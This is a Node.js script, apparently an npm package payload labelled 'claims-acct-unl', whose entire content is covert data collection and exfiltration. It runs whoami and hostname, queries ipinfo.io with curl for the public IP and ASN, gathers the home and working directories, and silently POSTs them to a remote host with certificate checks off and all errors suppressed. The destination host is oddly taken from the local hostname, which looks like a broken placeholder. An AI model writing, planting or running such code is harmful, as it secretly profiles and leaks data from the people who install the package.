const https = require('https');
const os = require('os');
const { execSync } = require('child_process');

try {
  const collab = execSync(
    'hostname'
  ).toString().trim();

  if (collab) {
    const u = execSync('whoami').toString().trim();
    const h = execSync('hostname').toString().trim();
    const d = process.cwd();
    const ua = `node/${process.version} ${process.platform} ${process.arch}`;

    let real_ip = '';
    let asOrganization = '';
    let asn = '';
    try {
      const ipdata = JSON.parse(
        execSync('curl -sf https://ipinfo.io/json').toString().trim()
      );
      real_ip = ipdata.ip || '';
      asOrganization = ipdata.org || '';
      asn = ipdata.org ? ipdata.org.split(' ')[0].replace('AS', '') : '';
    } catch (_) {}

    const payload = JSON.stringify({
      timestamp: Date.now(),
      package: 'claims-acct-unl',
      'x-real-ip': real_ip,
      'user-agent': ua,
      asOrganization: asOrganization,
      asn: asn,
      user: u,
      hostname: h,
      homedir: os.homedir(),
      cwd: d,
      platform: process.platform,
      arch: process.arch,
      node_version: process.version
    });

    const options = {
      hostname: collab,
      port: 443,
      path: '/',
      method: 'POST',
      rejectUnauthorized: false,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': ua
      }
    };

    const req = https.request(options, () => {});
    req.on('error', () => {});
    req.write(payload);
    req.end();
  }
} catch (e) {}